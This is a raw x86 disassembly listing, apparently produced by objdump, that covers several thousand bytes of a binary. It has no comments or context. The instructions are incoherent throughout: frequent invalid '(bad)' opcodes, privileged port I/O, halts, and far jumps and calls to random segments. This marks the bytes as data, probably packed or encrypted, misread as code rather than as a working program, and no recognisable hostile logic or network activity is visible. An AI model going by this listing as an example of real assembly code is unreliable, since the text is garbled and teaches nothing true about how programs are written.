  412885:	dec    eax
  412886:	fwait
  412887:	test   al,0xd6
  412889:	sub    BYTE PTR [eax+0x65edb7dc],al
  41288f:	push   esi
  412890:	pop    ss
  412891:	sub    BYTE PTR [edx],bh
  412893:	add    ebx,DWORD PTR [ecx]
  412895:	div    BYTE PTR [esi+0x4c]
  412898:	dec    esp
  412899:	push   ecx
  41289a:	fstp   st(0)
  41289c:	fsub   DWORD PTR [edx-0x48]
  41289f:	fcmovnbe st,st(5)
  4128a1:	pusha  
  4128a2:	scas   al,BYTE PTR es:[edi]
  4128a3:	retf   0xeddf
  4128a6:	in     eax,0x13
  4128a8:	(bad)  [edx-0x2f]
  4128ab:	add    BYTE PTR [edi-0x1165e89f],ah
  4128b1:	sbb    BYTE PTR [eax],ah
  4128b3:	test   BYTE PTR [ecx+0x5eb55c20],bl
  4128b9:	or     al,0x4e
  4128bb:	fistp  WORD PTR [eax]
  4128bd:	push   0x7cfa651c
  4128c2:	iret   
  4128c3:	jmp    0xb5cf:0x4866b146
  4128ca:	sti    
  4128cb:	not    DWORD PTR [esp+edi*2+0x279349be]
  4128d2:	or     edx,esi
  4128d4:	sub    ch,BYTE PTR [esi]
  4128d6:	retf   
  4128d7:	retf   0x510c
  4128da:	push   ds
  4128db:	lds    eax,FWORD PTR ds:0x9f200df1
  4128e1:	mov    ebp,0x6ed40435
  4128e6:	dec    esi
  4128e7:	scas   eax,DWORD PTR es:[edi]
  4128e8:	(bad)  [esi+esi*2]
  4128eb:	jmp    0x6eb8:0xa97ca33f
  4128f2:	lahf   
  4128f3:	cmc    
  4128f4:	test   eax,0x7fd2b6e
  4128f9:	mov    ebp,0x5024e8c1
  4128fe:	sti    
  4128ff:	addr16 aaa 
  412901:	mov    esi,0xd6f2a803
  412906:	lock xor al,BYTE PTR fs:[edi+esi*8]
  41290b:	xor    dl,BYTE PTR [edi+0x62]
  41290e:	mov    ah,0xf3
  412910:	inc    ebx
  412911:	lods   eax,DWORD PTR ds:[esi]
  412912:	jl     0x412933
  412914:	xor    BYTE PTR [ebx],ch
  412916:	in     al,dx
  412917:	add    eax,0xbc9f6e2d
  41291c:	popf   
  41291d:	shr    BYTE PTR [edi],cl
  41291f:	popf   
  412920:	es inc eax
  412922:	clc    
  412923:	retf   0x289d
  412926:	mov    bh,0x24
  412928:	mov    ds:0x1933b1fd,eax
  41292d:	popa   
  41292e:	mov    bl,0xc4
  412930:	mov    ds:0x1a8588ab,eax
  412935:	sbb    esp,DWORD PTR [edi]
  412937:	fwait
  412938:	leave  
  412939:	mov    DWORD PTR [ecx+0x5e],eax
  41293c:	push   ebp
  41293d:	out    dx,al
  41293e:	add    BYTE PTR [ebp+0x65807711],dl
  412944:	das    
  412945:	sub    eax,edi
  412947:	cmp    al,ah
  412949:	add    DWORD PTR [esi],ecx
  41294b:	cs mov esi,0x340a1f83
  412951:	cmp    eax,0x43614a0c
  412956:	scas   eax,DWORD PTR es:[edi]
  412957:	push   0xffffffec
  412959:	dec    ah
  41295b:	add    al,0x5d
  41295d:	mov    edx,0xdfe08cee
  412962:	pop    esi
  412963:	mov    ecx,0x4ab579cc
  412968:	sub    eax,DWORD PTR [ecx-0x26]
  41296b:	sub    al,0x59
  41296d:	into   
  41296e:	call   0xa435:0xa8c0dd32
  412975:	push   esi
  412976:	cmp    al,0x9f
  412978:	add    DWORD PTR [ecx],ebp
  41297a:	lods   al,BYTE PTR ds:[esi]
  41297b:	mov    gs,WORD PTR [eax-0x1f]
  41297e:	mov    eax,ds:0xae15b416
  412983:	pushf  
  412984:	push   esi
  412985:	push   edx
  412986:	sbb    eax,edx
  412988:	sub    al,0xe2
  41298a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41298b:	fwait
  41298c:	xchg   edx,eax
  41298d:	das    
  41298e:	or     eax,0x62d3013d
  412993:	arpl   WORD PTR [ebx-0x799912da],ax
  412999:	xchg   BYTE PTR [edx],dh
  41299b:	inc    ecx
  41299c:	dec    edx
  41299d:	imul   edx,DWORD PTR [esi+0x33],0xffffffb6
  4129a1:	(bad)  
  4129a2:	aad    0x71
  4129a4:	ret    
  4129a5:	jl     0x41294a
  4129a7:	test   DWORD PTR [edi+0x55],edi
  4129aa:	hlt    
  4129ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4129ac:	clc    
  4129ad:	pop    ebp
  4129ae:	out    0x12,eax
  4129b0:	icebp  
  4129b1:	and    dl,dl
  4129b3:	dec    ebx
  4129b4:	sbb    ebx,esp
  4129b6:	pop    edi
  4129b7:	or     al,0xda
  4129b9:	jmp    0x80d:0x8b049e6f
  4129c0:	mov    WORD PTR [esi-0x26f00680],?
  4129c6:	dec    edx
  4129c7:	mov    ecx,0x6b0ea102
  4129cc:	loopne 0x412956
  4129ce:	dec    eax
  4129cf:	xor    eax,0xe5452b07
  4129d4:	neg    BYTE PTR [edx]
  4129d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4129d7:	popf   
  4129d8:	add    BYTE PTR [edi],0xf8
  4129db:	push   esp
  4129dc:	push   ss
  4129dd:	xor    al,0xff
  4129df:	mov    dh,0x42
  4129e1:	lahf   
  4129e2:	xor    DWORD PTR [edi-0xa53f730],eax
  4129e8:	std    
  4129e9:	ficom  DWORD PTR [ebp+0x1a01a19d]
  4129ef:	addr16 mov bl,0xd8
  4129f2:	mov    bl,0x2
  4129f4:	pop    ebx
  4129f5:	arpl   WORD PTR [eax-0x23e1613e],sp
  4129fb:	sbb    BYTE PTR [edx-0x1c0e94f0],cl
  412a01:	popa   
  412a02:	cmp    eax,DWORD PTR [edx+0x40975873]
  412a08:	add    al,0xa0
  412a0a:	or     al,0xb6
  412a0c:	aas    
  412a0d:	add    eax,DWORD PTR ds:0x6b86b54
  412a13:	fisttp WORD PTR [ebp+0x398178e2]
  412a19:	add    ch,BYTE PTR [edi+0x3d]
  412a1c:	arpl   WORD PTR [ecx],cx
  412a1e:	fdivr  DWORD PTR [ecx-0x39]
  412a21:	push   ebp
  412a22:	mov    esp,DWORD PTR [ebp+0x651ff1a2]
  412a28:	pop    ecx
  412a29:	jae    0x412a44
  412a2b:	ficomp DWORD PTR ds:0x5dedac4f
  412a31:	inc    esi
  412a32:	rcl    BYTE PTR fs:[eax],1
  412a35:	push   ecx
  412a36:	push   esi
  412a37:	jo     0x412a0d
  412a39:	jno    0x4129e2
  412a3b:	dec    edx
  412a3c:	xor    eax,0x806b8b8d
  412a41:	ret    0x1154
  412a44:	push   eax
  412a45:	mov    bh,0x88
  412a47:	pushf  
  412a48:	push   edi
  412a49:	gs jo  0x412ab2
  412a4c:	dec    eax
  412a4d:	dec    esp
  412a4e:	bound  ecx,QWORD PTR [edx+0x6089576e]
  412a54:	in     eax,0xd4
  412a56:	cmp    DWORD PTR [edi+ebp*4],ecx
  412a59:	xchg   ecx,eax
  412a5a:	sbb    al,0x57
  412a5c:	xadd   BYTE PTR [esi],cl
  412a5f:	sbb    dh,BYTE PTR [ebp-0x4884a903]
  412a65:	fist   WORD PTR [edx]
  412a67:	ror    DWORD PTR [esi],cl
  412a69:	pop    edx
  412a6a:	and    eax,0xb699ef12
  412a6f:	mov    bh,0x28
  412a71:	aaa    
  412a72:	jb     0x412aac
  412a74:	lahf   
  412a75:	push   es
  412a76:	das    
  412a77:	ror    BYTE PTR [edi-0x40799e03],0xeb
  412a7e:	pop    esp
  412a7f:	or     edx,0x78
  412a82:	pop    esi
  412a83:	xchg   BYTE PTR [esi-0x6b724111],cl
  412a89:	fisubr DWORD PTR [edi-0x60d5bde1]
  412a8f:	fld    DWORD PTR [esi+0x4be59d9a]
  412a95:	(bad)  
  412a96:	ins    DWORD PTR es:[edi],dx
  412a97:	jle    0x412aa9
  412a99:	adc    eax,0xebe97ba3
  412a9e:	dec    eax
  412a9f:	outs   dx,BYTE PTR ds:[esi]
  412aa0:	push   0xffffff9a
  412aa2:	cli    
  412aa3:	cwde   
  412aa4:	cli    
  412aa5:	xchg   ecx,eax
  412aa6:	pop    ss
  412aa7:	cmp    ch,0x4e
  412aaa:	mov    bl,0xd2
  412aac:	adc    ecx,DWORD PTR [ecx-0x1c94a6d6]
  412ab2:	mov    edi,0xaf14bd46
  412ab7:	pushf  
  412ab8:	sub    esi,DWORD PTR [edx]
  412aba:	adc    ah,BYTE PTR [esi-0x55ac1997]
  412ac0:	add    DWORD PTR [ecx],edx
  412ac2:	dec    eax
  412ac3:	je     0x412ae7
  412ac5:	cdq    
  412ac6:	int3   
  412ac7:	pop    edx
  412ac8:	rol    BYTE PTR [edi],0xef
  412acb:	cmc    
  412acc:	xchg   ebx,eax
  412acd:	clc    
  412ace:	sub    DWORD PTR [esi],ecx
  412ad0:	mov    al,0x3e
  412ad2:	inc    edx
  412ad3:	mov    eax,ds:0xcaf6f351
  412ad8:	xor    esp,edx
  412ada:	fiadd  DWORD PTR [esp+ebp*1]
  412add:	leave  
  412ade:	xor    BYTE PTR [eax-0x6d2ce0c4],0x1
  412ae5:	mov    edx,DWORD PTR [eax-0x7c]
  412ae8:	jmp    DWORD PTR [ebx]
  412aea:	test   eax,0x54758abb
  412aef:	test   al,0x60
  412af1:	and    BYTE PTR [edi+0x2032371a],ah
  412af7:	cwde   
  412af8:	iret   
  412af9:	pop    ss
  412afa:	adc    DWORD PTR [ebp-0x73b49e0],esp
  412b00:	jmp    FWORD PTR [ecx]
  412b02:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  412b04:	or     eax,0x7034fa7d
  412b09:	mov    WORD PTR [ebx],ss
  412b0b:	jnp    0x412aac
  412b0d:	jae    0x412a90
  412b0f:	out    dx,al
  412b10:	sbb    eax,0x73a43db0
  412b15:	adc    eax,0x64983a2e
  412b1a:	sahf   
  412b1b:	pop    ds
  412b1c:	pop    ebx
  412b1d:	test   al,0x4
  412b1f:	push   ss
  412b20:	imul   ebp,DWORD PTR [ecx],0x69839d37
  412b26:	mov    ecx,0x3061672e
  412b2b:	jecxz  0x412b48
  412b2d:	out    0x8f,eax
  412b2f:	aaa    
  412b30:	adc    bh,BYTE PTR [eax]
  412b32:	cmp    BYTE PTR [edi+0x9fa1848],0xf3
  412b39:	jb     0x412b31
  412b3b:	fwait
  412b3c:	add    BYTE PTR [ecx-0x2d],dh
  412b3f:	ja     0xf10575c0
  412b45:	ss jl  0x412b7c
  412b48:	dec    ebp
  412b49:	aad    0x3e
  412b4b:	xchg   DWORD PTR ds:0xb6630cb8,ecx
  412b51:	loop   0x412b67
  412b53:	int3   
  412b54:	(bad)  
  412b55:	jge    0x412bb2
  412b57:	cmp    eax,0x3ca2e5fb
  412b5c:	inc    ebp
  412b5d:	fstp   DWORD PTR [edx+0x6989ba3f]
  412b63:	ficom  WORD PTR cs:[edx+0x8]
  412b68:	cmp    BYTE PTR [ebp+0x2],al
  412b6b:	fmul   QWORD PTR [edi-0x593da070]
  412b71:	loopne 0x412b73
  412b73:	and    al,0x19
  412b75:	js     0x412b13
  412b77:	test   al,0xe1
  412b79:	test   ebp,eax
  412b7b:	or     al,0x15
  412b7d:	or     esp,ebx
  412b7f:	adc    eax,0x89c37419
  412b84:	jns    0x412b5b
  412b86:	imul   esi,eax,0x61
  412b89:	idiv   DWORD PTR [ebp+0x7b24772f]
  412b8f:	cmp    ecx,DWORD PTR [edi-0x43]
  412b92:	cdq    
  412b93:	jecxz  0x412bb4
  412b95:	sub    ebx,edx
  412b97:	adc    edx,DWORD PTR [esi]
  412b99:	ret    0x42eb
  412b9c:	pop    ss
  412b9d:	imul   ebp,DWORD PTR [eax+edi*8],0x6f730c8c
  412ba4:	rol    BYTE PTR [ecx],1
  412ba6:	(bad)  
  412ba7:	rol    BYTE PTR [ebx+0x3e],cl
  412baa:	mov    es,WORD PTR [ecx+0x5b078c97]
  412bb0:	jmp    0x2d89:0x1d8592d9
  412bb7:	push   es
  412bb8:	fs stos DWORD PTR es:[edi],eax
  412bba:	ja     0x412bf7
  412bbc:	mov    esi,0x9ae8f50c
  412bc1:	aad    0xf
  412bc3:	mov    ebx,0xe7ed650a
  412bc8:	imul   ecx,DWORD PTR [ecx-0x32f10434],0xffffffec
  412bcf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412bd0:	dec    ebx
  412bd1:	add    DWORD PTR [ebx+edi*4+0x4a],ecx
  412bd5:	pop    ebx
  412bd6:	cmp    eax,0x103f229f
  412bdb:	cmp    cl,bh
  412bdd:	out    0xf,eax
  412bdf:	push   0xee8e08a2
  412be4:	or     ah,dl
  412be6:	xchg   edi,eax
  412be7:	gs in  eax,0x53
  412bea:	mov    edx,DWORD PTR [eax+0x5]
  412bed:	xchg   BYTE PTR [edx-0x61],bl
  412bf0:	out    dx,eax
  412bf1:	ja     0x412ba0
  412bf3:	scas   eax,DWORD PTR es:[edi]
  412bf4:	cli    
  412bf5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412bf6:	and    BYTE PTR [edi],dh
  412bf8:	mov    edx,0xe9f32ce9
  412bfd:	sbb    al,0xc0
  412bff:	nop
  412c00:	imul   edi,DWORD PTR [esi+0x20],0xffffff83
  412c04:	mov    al,0xa3
  412c06:	retf   
  412c07:	(bad)  
  412c09:	stos   DWORD PTR es:[edi],eax
  412c0a:	inc    ecx
  412c0b:	fcmovnbe st,st(5)
  412c0d:	dec    edx
  412c0e:	mov    ds:0xf2fe0069,al
  412c13:	sbb    ah,bl
  412c15:	mov    bh,0xd7
  412c17:	or     al,dl
  412c19:	(bad)  
  412c1a:	and    dh,BYTE PTR [edx-0x7a]
  412c1d:	cdq    
  412c1e:	push   esi
  412c1f:	int    0x7f
  412c21:	fistp  DWORD PTR [eax]
  412c23:	xchg   edx,eax
  412c24:	repz cld 
  412c26:	xor    eax,0x9994dd8b
  412c2b:	jmp    0x2433c8e9
  412c30:	push   ebx
  412c31:	push   ebx
  412c32:	dec    esi
  412c33:	mov    eax,0x3b88e010
  412c38:	mov    DWORD PTR [eax*4+0x2fd91e6],eax
  412c3f:	inc    eax
  412c40:	arpl   WORD PTR [edi-0xcb8eb94],cx
  412c46:	iret   
  412c47:	adc    DWORD PTR [edx-0x4476cc4c],edi
  412c4d:	aad    0x57
  412c4f:	sub    ebx,DWORD PTR [edi+0x684b5aa8]
  412c55:	adc    bh,bh
  412c57:	ss int3 
  412c59:	test   DWORD PTR [esi-0xd1249d1],eax
  412c5f:	fst    st(3)
  412c61:	js     0x412c83
  412c63:	lock dec ebp
  412c65:	rcr    BYTE PTR [esi-0x29],cl
  412c68:	adc    BYTE PTR [eax+0x9d70f06],0x7a
  412c6f:	addr16 addr16 aad 0x2b
  412c73:	push   0x697f3051
  412c78:	ins    BYTE PTR es:[edi],dx
  412c79:	mov    ebp,0xc73a039
  412c7e:	fidiv  WORD PTR [ecx-0x41]
  412c81:	pop    edx
  412c82:	rcl    BYTE PTR [esi],1
  412c84:	mov    bh,0x3a
  412c86:	mov    ebx,0x1511f5e7
  412c8b:	sahf   
  412c8c:	paddusb mm7,QWORD PTR [ebx-0x32859645]
  412c93:	pushf  
  412c94:	test   ebp,ebp
  412c96:	xchg   ebp,eax
  412c97:	jae    0x412cc9
  412c99:	jb     0x412cb1
  412c9b:	sub    al,0x41
  412c9d:	pop    ds
  412c9e:	push   ecx
  412c9f:	inc    eax
  412ca0:	mov    esi,DWORD PTR ds:0x84be790a
  412ca6:	xchg   DWORD PTR [edx-0x50],ebp
  412ca9:	mov    dl,0xde
  412cab:	aas    
  412cac:	out    dx,al
  412cad:	sbb    eax,0x72ea47f8
  412cb2:	push   0x50
  412cb4:	inc    ebp
  412cb5:	(bad)  
  412cb7:	ret    0x3da7
  412cba:	outs   dx,DWORD PTR ds:[esi]
  412cbb:	mov    al,0x89
  412cbd:	rcl    BYTE PTR [ecx-0x76deb2ec],cl
  412cc3:	inc    ebp
  412cc4:	xchg   edi,eax
  412cc5:	push   esp
  412cc6:	fistp  QWORD PTR [ebx-0x8c33cf9]
  412ccc:	enter  0xe8f8,0xfa
  412cd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412cd1:	fdivp  st(7),st
  412cd3:	into   
  412cd4:	aad    0xc
  412cd6:	(bad)  
  412cd7:	fstp   DWORD PTR [edx*4+0xb2f0e18]
  412cde:	stos   BYTE PTR es:[edi],al
  412cdf:	sbb    ecx,ebp
  412ce1:	mov    bh,0x8e
  412ce3:	ja     0x412c6c
  412ce5:	hlt    
  412ce6:	(bad)  
  412ce7:	xor    bh,bl
  412ce9:	pop    ds
  412cea:	mov    bh,BYTE PTR [eax+0x91bf75]
  412cf0:	call   0xdd77c222
  412cf5:	jns    0x412c8b
  412cf7:	and    bl,ch
  412cf9:	mov    dh,0xcd
  412cfb:	repnz pop ebx
  412cfd:	xor    dl,BYTE PTR [ecx-0x3f]
  412d00:	frstor ds:0xc8c88dff
  412d06:	mov    esp,0xd2a27773
  412d0b:	mov    edi,0xc6ea62d5
  412d10:	cmp    al,0x3
  412d12:	pusha  
  412d13:	jl     0x412d4d
  412d15:	mov    BYTE PTR [esi],cl
  412d17:	inc    ecx
  412d18:	fwait
  412d19:	out    dx,al
  412d1a:	lahf   
  412d1b:	pop    eax
  412d1c:	jb     0x412cb4
  412d1e:	cmc    
  412d1f:	mov    ds:0xb4c8bec6,eax
  412d24:	les    esi,FWORD PTR [ebp+0x582198b9]
  412d2a:	xchg   edi,eax
  412d2b:	mov    ah,BYTE PTR [ebx+edx*2-0x35474885]
  412d32:	(bad)  
  412d33:	and    DWORD PTR [ecx],ecx
  412d35:	pop    edx
  412d36:	jecxz  0x412d45
  412d38:	fwait
  412d39:	sbb    ah,dl
  412d3b:	adc    dh,BYTE PTR [ebx]
  412d3d:	pop    eax
  412d3e:	push   0x52
  412d40:	add    al,0xb6
  412d42:	mov    eax,ds:0x3125fcdc
  412d47:	bswap  esp
  412d49:	mov    ds:0x5059a22b,eax
  412d4e:	scas   al,BYTE PTR es:[edi]
  412d4f:	jl     0x412d54
  412d51:	test   eax,0xf419972b
  412d56:	push   ds
  412d57:	or     dh,ah
  412d59:	sbb    BYTE PTR [esi+ebx*8],dh
  412d5c:	(bad)  
  412d5d:	in     al,0x1d
  412d5f:	mov    bl,0x1e
  412d61:	leave  
  412d62:	push   ebp
  412d63:	pop    edi
  412d64:	dec    esp
  412d65:	and    DWORD PTR [edi-0x4fe5cf48],0xff1b08d5
  412d6f:	popa   
  412d70:	(bad)  
  412d71:	ins    BYTE PTR es:[edi],dx
  412d72:	and    al,0xd1
  412d74:	test   eax,0x4f39bc3f
  412d79:	test   eax,0x25d47b59
  412d7e:	fsub   QWORD PTR [edx-0x20]
  412d81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d82:	push   ebx
  412d83:	pop    ebx
  412d84:	shl    BYTE PTR [ebp-0x6dac2851],0xb1
  412d8b:	mov    ebx,0x5475c956
  412d90:	call   0x618216b5
  412d95:	add    esi,DWORD PTR [ebp+0x70]
  412d98:	ret    
  412d99:	mul    BYTE PTR [eax]
  412d9b:	or     BYTE PTR ds:0x9a847ba0,0xd5
  412da2:	mov    al,ds:0xd537bd4
  412da7:	rol    BYTE PTR [ecx-0x6bd22fb7],0xab
  412dae:	clts   
  412db0:	mov    ah,0x21
  412db2:	or     eax,edi
  412db4:	retf   0x7402
  412db7:	mov    ch,0x8a
  412db9:	mov    al,ds:0xe2e7cdd7
  412dbe:	hlt    
  412dbf:	jl     0x412def
  412dc1:	add    eax,0xe6efc942
  412dc6:	xchg   ebx,eax
  412dc7:	inc    edx
  412dc8:	gs sbb al,0x8d
  412dcb:	stos   BYTE PTR es:[edi],al
  412dcc:	sbb    eax,esi
  412dce:	and    al,0xf9
  412dd0:	ss scas eax,DWORD PTR es:[edi]
  412dd2:	jle    0x412e3c
  412dd4:	inc    ecx
  412dd5:	sub    dh,0x1e
  412dd8:	and    BYTE PTR [eax+0x4e37c6a4],bl
  412dde:	xchg   ah,al
  412de0:	or     eax,0x920a6c49
  412de5:	neg    BYTE PTR ds:0xfbec8e00
  412deb:	mov    cs,WORD PTR [ebx]
  412ded:	outs   dx,BYTE PTR ds:[esi]
  412dee:	cdq    
  412def:	pushf  
  412df0:	xchg   bh,ch
  412df2:	mov    ds,WORD PTR [edi]
  412df4:	dec    eax
  412df5:	xor    cl,cl
  412df7:	and    bl,dl
  412df9:	sti    
  412dfa:	and    DWORD PTR [ebx+0x12f6ac43],esi
  412e00:	inc    ecx
  412e01:	and    al,dl
  412e03:	adc    eax,0x3f977ed7
  412e08:	dec    ebp
  412e09:	push   ss
  412e0a:	out    0xae,al
  412e0c:	mov    ecx,DWORD PTR [edi+ebx*4+0x53]
  412e10:	inc    ecx
  412e11:	xchg   dl,ah
  412e13:	pop    esp
  412e14:	mov    BYTE PTR [di],al
  412e17:	adc    BYTE PTR [eax],ch
  412e19:	add    BYTE PTR [ecx],bh
  412e1b:	in     eax,0xe4
  412e1d:	mov    cl,0x2a
  412e1f:	adc    DWORD PTR [ebx+0x6c2b1bac],0x4c
  412e26:	iret   
  412e27:	dec    ecx
  412e28:	xchg   BYTE PTR [esp+edx*8-0x1c],cl
  412e2c:	adc    si,WORD PTR [edi]
  412e2f:	add    ebp,DWORD PTR [ebp-0x1c5f8a1f]
  412e35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e36:	pop    es
  412e37:	pop    edx
  412e38:	xlat   BYTE PTR ds:[ebx]
  412e39:	fcomip st,st(7)
  412e3b:	sbb    ebp,ebx
  412e3d:	pop    ecx
  412e3e:	dec    eax
  412e3f:	push   0x794cc4d9
  412e44:	retf   
  412e45:	dec    esi
  412e46:	push   0xffffff86
  412e48:	stc    
  412e49:	sbb    bh,dh
  412e4b:	mov    BYTE PTR [edi],bh
  412e4d:	and    al,BYTE PTR [edi+0x6c]
  412e50:	push   ebx
  412e51:	sbb    eax,0xf6456a3c
  412e56:	clc    
  412e57:	pop    ecx
  412e58:	pusha  
  412e59:	jl     0x412e6a
  412e5b:	lea    ebx,[ebx-0x6]
  412e5e:	dec    ebx
  412e5f:	adc    al,0x2b
  412e61:	inc    edi
  412e62:	cmp    DWORD PTR [eax],esp
  412e64:	push   esi
  412e65:	xor    al,0x33
  412e67:	pop    ss
  412e68:	fucom  st(7)
  412e6a:	mov    ch,dh
  412e6c:	ror    BYTE PTR [ebx+0x38e740a3],cl
  412e72:	mov    ch,dh
  412e74:	jbe    0x412e76
  412e76:	or     al,BYTE PTR [ebp+ebp*2-0x76]
  412e7a:	repnz shl edi,0xf4
  412e7e:	push   edx
  412e7f:	mov    al,ds:0x9e2b4cbb
  412e84:	loope  0x412e0b
  412e86:	jno    0x412ebf
  412e88:	ret    0x618e
  412e8b:	push   esp
  412e8c:	fisubr WORD PTR [ebp+0x40]
  412e8f:	sti    
  412e90:	out    0x69,ax
  412e93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412e94:	rcr    BYTE PTR [esi-0x5b118b9c],0x21
  412e9b:	xchg   BYTE PTR [ecx],bl
  412e9d:	xchg   ebp,eax
  412e9e:	push   edi
  412e9f:	jne    0x412e75
  412ea1:	mov    ds:0x73505015,eax
  412ea6:	pushf  
  412ea7:	sub    eax,0x5ba024d1
  412eac:	adc    dh,BYTE PTR [ecx+0x65]
  412eaf:	push   ebx
  412eb0:	xor    ch,BYTE PTR [ebx]
  412eb2:	sub    eax,0x886c25d6
  412eb7:	cs sbb al,ah
  412eba:	loop   0x412ef2
  412ebc:	stos   BYTE PTR es:[edi],al
  412ebd:	mov    esi,DWORD PTR [ebp+0x4f]
  412ec0:	cld    
  412ec1:	call   0xbf8c:0x5a27e027
  412ec8:	aas    
  412ec9:	aad    0x4a
  412ecb:	inc    edi
  412ecc:	clc    
  412ecd:	sti    
  412ece:	test   al,0xbf
  412ed0:	pop    ecx
  412ed1:	repz cdq 
  412ed3:	push   ds
  412ed4:	cld    
  412ed5:	out    dx,al
  412ed6:	mov    eax,ds:0x6f6b4830
  412edb:	(bad)  
  412edc:	xchg   ecx,eax
  412edd:	mov    eax,0xb859ae2
  412ee2:	ins    BYTE PTR es:[edi],dx
  412ee3:	jl     0x412f48
  412ee5:	fistp  QWORD PTR [eax]
  412ee7:	mov    dl,0x43
  412ee9:	out    dx,eax
  412eea:	adc    esp,DWORD PTR [edx+0x4a9eb450]
  412ef0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ef1:	dec    edx
  412ef2:	mov    ch,0xdd
  412ef4:	push   ss
  412ef5:	lods   al,BYTE PTR ds:[esi]
  412ef6:	jle    0x412eb0
  412ef8:	dec    esi
  412ef9:	add    eax,0x52aaf7ad
  412efe:	inc    ebx
  412eff:	sbb    BYTE PTR [ebp-0x7e06b81a],bl
  412f05:	sub    al,0x66
  412f07:	push   edi
  412f08:	add    dl,ch
  412f0a:	push   eax
  412f0b:	add    bh,0x61
  412f0e:	mov    BYTE PTR [ebp-0x6e],bl
  412f11:	sub    eax,0xc4a29e8e
  412f16:	int    0xf8
  412f18:	xchg   ebx,eax
  412f19:	fld    TBYTE PTR [edx]
  412f1b:	aad    0x12
  412f1d:	dec    edi
  412f1e:	in     eax,dx
  412f1f:	je     0x412f8a
  412f21:	push   es
  412f22:	mov    al,ds:0x7a9aacfe
  412f27:	or     BYTE PTR [edi+0x3e77b675],ah
  412f2d:	icebp  
  412f2e:	mov    WORD PTR [edi],es
  412f30:	jbe    0x412efd
  412f32:	das    
  412f33:	fwait
  412f34:	add    al,0x90
  412f36:	ret    0x125d
  412f39:	dec    edi
  412f3a:	pop    esi
  412f3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f3c:	ret    0x7674
  412f3f:	adc    DWORD PTR [edi],ecx
  412f41:	mov    es,esp
  412f43:	jmp    FWORD PTR [eax]
  412f45:	cmc    
  412f46:	push   ebx
  412f47:	lock xor eax,0x9f89c5db
  412f4d:	dec    ebp
  412f4e:	arpl   si,si
  412f50:	sub    DWORD PTR [edx+0x7160d19f],eax
  412f56:	cmpps  xmm4,XMMWORD PTR [eax+ecx*1],0x12
  412f5b:	xor    al,0x44
  412f5d:	or     eax,0xd0240fe7
  412f62:	jns    0x412f90
  412f64:	and    esp,DWORD PTR [eax]
  412f66:	jg     0x412f3c
  412f68:	mov    esi,0x5d47aa3d
  412f6d:	retf   0xc953
  412f70:	pop    ebx
  412f71:	in     al,dx
  412f72:	pop    ds
  412f73:	(bad)  
  412f75:	int    0x32
  412f77:	xchg   ebp,edx
  412f79:	repnz ins DWORD PTR es:[edi],dx
  412f7b:	push   esi
  412f7c:	and    DWORD PTR [esi],ebp
  412f7e:	pop    ebp
  412f7f:	fild   WORD PTR [ecx-0xc]
  412f82:	push   edx
  412f83:	cmp    al,0x40
  412f85:	mul    BYTE PTR [ecx]
  412f87:	ret    0x5da5
  412f8a:	call   0x5aa7:0x401212c3
  412f91:	hlt    
  412f92:	mov    ebp,0x37806023
  412f97:	shl    edi,cl
  412f99:	jns    0x412fa7
  412f9b:	or     cl,bl
  412f9d:	jmp    0x3430fd86
  412fa2:	lds    edx,FWORD PTR [edi+0x78709c43]
  412fa8:	pop    ebp
  412fa9:	cdq    
  412faa:	or     eax,0x773698c9
  412faf:	ret    0x978
  412fb2:	push   cs
  412fb3:	in     al,dx
  412fb4:	test   eax,0x4948500d
  412fb9:	neg    esp
  412fbb:	call   0x3c75042c
  412fc0:	and    eax,0x1e7ffe8b
  412fc5:	inc    esi
  412fc6:	aad    0x7d
  412fc8:	popa   
  412fc9:	adc    BYTE PTR [edi-0x7d7dd1bb],cl
  412fcf:	pusha  
  412fd0:	jo     0x412fc3
  412fd2:	arpl   WORD PTR [ecx+eiz*4+0x3d],ax
  412fd6:	xor    eax,0x13d45266
  412fdb:	cs enter 0xd95b,0x70
  412fe0:	xchg   ebx,eax
  412fe1:	shl    DWORD PTR [ecx],1
  412fe3:	add    dh,0x1c
  412fe6:	ja     0x412f71
  412fe8:	mov    ebx,0x40bd63f4
  412fed:	mov    ch,0x52
  412fef:	pop    es
  412ff0:	pop    edi
  412ff1:	sub    al,0xf6
  412ff3:	pop    ds
  412ff4:	jo     0x413019
  412ff6:	test   eax,0xbeb8c7c6
  412ffb:	sub    esi,esp
  412ffd:	fild   QWORD PTR [edx+0x7]
  413000:	aaa    
  413001:	ret    0x25a9
  413004:	jmp    0x3f0f:0x422454f4
  41300b:	mov    al,0xb3
  41300d:	dec    ebx
  41300e:	xor    cl,bl
  413010:	inc    edi
  413011:	xor    eax,0x34476b4b
  413016:	mov    ecx,0x10442e51
  41301b:	or     cl,BYTE PTR ds:[ebx+esi*8]
  41301f:	mov    ch,BYTE PTR [esi-0x7f]
  413022:	sub    DWORD PTR [esi+0x55],ebx
  413025:	addr16 fcmovnbe st,st(2)
  413028:	push   ebx
  413029:	push   ebp
  41302a:	rcr    DWORD PTR [edi-0x1f511fee],cl
  413030:	test   edi,ebx
  413032:	in     al,dx
  413033:	sar    al,cl
  413035:	jmp    0x6f19bc83
  41303a:	dec    ecx
  41303b:	fwait
  41303c:	adc    DWORD PTR [edx+edx*8],ecx
  41303f:	rcl    DWORD PTR [ecx-0x49],cl
  413042:	jle    0x413050
  413044:	iret   
  413045:	xchg   edi,eax
  413046:	sbb    dl,0x6a
  413049:	in     al,0x9e
  41304b:	mov    edx,0xec8f6e83
  413050:	or     al,0x34
  413052:	enter  0xb6cb,0xbf
  413056:	(bad)  
  413057:	cli    
  413058:	into   
  413059:	and    esp,esi
  41305b:	(bad)  
  41305c:	aaa    
  41305d:	inc    esi
  41305e:	addr16 nop
  413060:	xchg   ebp,eax
  413061:	fs (bad) 
  413063:	xchg   esp,eax
  413064:	cmp    ebp,ecx
  413066:	retf   0x99ea
  413069:	nop
